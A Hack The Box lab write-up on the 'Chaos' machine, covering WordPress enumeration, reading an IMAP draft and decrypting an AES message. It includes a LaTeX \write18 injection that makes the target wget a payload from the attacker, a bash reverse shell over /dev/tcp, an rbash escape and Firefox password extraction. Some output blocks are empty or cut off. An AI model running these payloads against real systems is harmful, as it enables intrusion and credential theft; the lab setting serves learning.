# Hack The Box: Chaos machine write-up

Although this machine wasn't rated as really difficult, I found it particularly challenging, as it looked as a series of CTF puzzles that had to be put together in order to go forward. The machine starts with a normal wp site, from where we can gain some credentials. Then, from an email server a message can be found, which leads to yet another webpage that provides a pdf service. A latex injection, which was pretty cool, was used to gain RCE, the later being leveraged in order to gain a restricted shell. After escaping the shell and gaining user, root is pretty straightforward, we just need to find two firefox password files which will show the root creds.

Let's start! The machine is running on port 10.10.10.120, although as always, I added ``chaos`` to my ``/etc/hosts`` file.

### Enumeration

First, I enumerate open ports to discover the services running in the machine:

```sh
nmap -sV -sC -oA nmap/initial chaos
```

```console
# Nmap 7.01 scan initiated Fri Jan 18 08:15:18 2019 as: nmap -sV -sC -oA nmap/initial chaos

```

We can see that there are different things running on the server: email servers and web servers. I'll start by inspecting the web ones.

### Web service I

*Accessing web server on port 80*

![Img](/assets/posts_details/Chaos/images/web1.png "Img")

Given that there was nothing I fired up DirBuster and it found that there was a wordpress installation under ``/wp/wordpress`` (I won't include the whole DirBuster report, as it's too long, but you can find it in files).

*Wordpress installation*

![Img](/assets/posts_details/Chaos/images/web2.png "Img")

However, it looks it's password-protected... At this point I tried running more file enumerations, but without luck. Then, I remembered that ``wpscan`` exists! I ran it with the following command:

```console
ruby wpscan.rb --url http://chaos/wp/wordpress --enumerate u
```

Output:

```

So we found the user! We'll try ``human``.

Good! More credentials: ``ayush:jiujitsu``.

I tried them on the other web server I found, which was an instance of ``Webmin`` running on port 10000. However, no luck.

#### Mail server

Hence, not getting anything I moved on to the mail servers. I learned how to connect to imap through tutorials and after different attempts I managed to find something.

The command I ran is:

```
openssl s_client -connect chaos:993
```

Then, once inside:

```
A1 LOGIN ayush jiujitsu
a2 LIST "" "*"
a3 examine Drafts
a4 fetch 1 body[]
a5 logout
```

I think the commands are self-explanatory, so I won't be explaining them. Their output is the following:

```console
parallels@ubuntu:~/Desktop/Chaos$ openssl s_client -connect chaos:993

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,

The draft email I found contained some interesting things, so far so good. I tried to base64 decode it and found a python script:

```py
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```

What this script did was basically encrypt a message with AES CBC. I was able to recover the content given that the Initialization Vector (IV) was written to the file alongside the encrypted data.

You can find my script [here](files/decrypt.py).

*Contents of encrypted message*

### Web service II

I wasn't able to find anything on the path, so I tried adding ``chaos.htb`` to my ``/etc/hosts``, also pointing to 10.10.10.120.

*Chaos.htb webpage*

![Img](/assets/posts_details/Chaos/images/web5.png "Img")

I couldn't find anything in there so back I went to the weird path. Now, something went wrong, and only after spending some hours and asking someone on the chat I was told that my script was missing two characters. So I added the obvious ``r3`` that was missing and booom! I got access to a pdf creation service!

*PDF creation service*

![Img](/assets/posts_details/Chaos/images/pdf.png "Img")

### RCE

Of the three templates only one was working. I was able to get RCE, thanks to the fact that ``\write18`` was enabled. However, this one was kind of blind-ish, given that I couldn't see the created pdf.

*First test of RCE*

![Img](/assets/posts_details/Chaos/images/rce-test1.png "Img")

![Img](/assets/posts_details/Chaos/images/rce-test2.png "Img")

It works! Now I just need a way to get a proper shell!

I had the following idea: on two different requests I could upload a reverse shell and then execute it (listening on my machine with netcat).

The shell I uploaded as ``rev.php`` was:

```php
<?php exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.13.211/1234 0>&1'");
```

In order to automate everything (I know, a bit lazy) I wrote a simple bash script that made my life so much easier:

```sh
gnome-terminal -e "nc -lnvp 1234"
gnome-terminal -e "python -m SimpleHTTPServer 8001"

curl -i -s -k -X 'POST' --data 'content=\write18{wget 10.10.13.211:8001/rev.php}&template=test1' http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php

curl -i -s -k -X 'POST' --data 'content=\write18{php rev.php}&template=test1' http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php
```

Running that resulted in a shell!

*Reverse shell gained*

![Img](/assets/posts_details/Chaos/images/rev-shell.png "Img")

### Getting user

It took me a while to realise that I already had the credentials for ``ayush``, so I just needed to upgrade my shell to a pty shell in order to run ``su ayush`` (with ``jiujitsu`` as password). I used python to accomplish that:

```py
python -c "import pty; pty.spawn('/bin/bash')"
```

However, after getting to be ayush I found out that I was in a restricted shell, in ``rbash`` to be precise. After a lot of googling I came across the following workaround:

```console
tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

This command allowed me to get out of the shell. However, once out I found that the $PATH variable wasn't properly configured. Thus, in order to avoid having to write ``/bin/ls`` instead of just ``ls`` I modified it:

```console
export PATH=/usr/local/bin:/usr/bin:/bin:/home/ayush/.app
```

After all of that, I was able to read ``user.txt``!

### Root

I must say that after all the problems I had to get to user, root was really easy. Basically, inside ``/home/ayush`` there was a ``.mozilla`` directory, which held data saved from previous sessions.

*``/home/ayush``*

I find two files that let me copy the passwords to my firefox app: ``logins.json`` and ``key4.db``. So I just copy them to my profile directory in firefox and go to preferences on my machine. I tried ``jiujitsu`` as master password and voilà, I had the root password!

And therefore we can just do ``sudo su`` and read ``root.txt``.

I hope you learned something, until next time!
